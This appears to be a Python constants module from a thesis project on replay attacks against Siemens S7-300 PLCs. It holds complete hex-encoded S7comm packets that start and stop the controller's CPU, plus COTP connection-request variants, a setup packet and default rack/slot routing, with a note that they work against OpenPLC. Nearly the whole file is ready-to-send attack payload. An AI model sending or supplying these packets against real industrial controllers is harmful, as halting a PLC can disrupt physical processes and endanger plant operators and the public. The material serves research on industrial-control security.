"""Captured S7comm replay payloads (TIA Portal Start/Stop CPU on S7-300).

Source: thesis section 4.3 — replay of packets captured between PLC and TIA Portal.
Function codes: 0x28 (PLC Control / PI-Service P_PROGRAM start), 0x29 (PLC Stop).
"""

# Validated: TPKT length field matches packet size.
CPU_START_PAYLOAD_HEX = (
    "0300002502f0803201000005000014000028000000000000"
    "fd000009505f50524f4752414d"
)

CPU_STOP_PAYLOAD_HEX = (
    "0300002102f08032010000060000100000290000000000"
    "09505f50524f4752414d"
)

CPU_START_PAYLOAD = bytes.fromhex(CPU_START_PAYLOAD_HEX)
CPU_STOP_PAYLOAD = bytes.fromhex(CPU_STOP_PAYLOAD_HEX)

# COTP variants (tried in order until Connection Confirm 0xd0).
# [0] SiemensScan / Snap7-style — works with OpenPLC Runtime (plc_main).
# [1] TIA-style dst TSAP 0102 (rack 0, slot 2) from docs/Report/Theory_S7.md.
COTP_CR_VARIANTS_HEX = [
    "0300001611e00000000100c0010ac1020100c2020101",
    "0300001611e00000000f00c0010ac1020102c1020100",
]

S7_SETUP_HEX = "0300001902f08032010000722f00080000f0000001000101e0"

# Default snap7 routing for OpenPLC (see docs/Installation guides).
DEFAULT_RACK = 0
DEFAULT_SLOT = 2
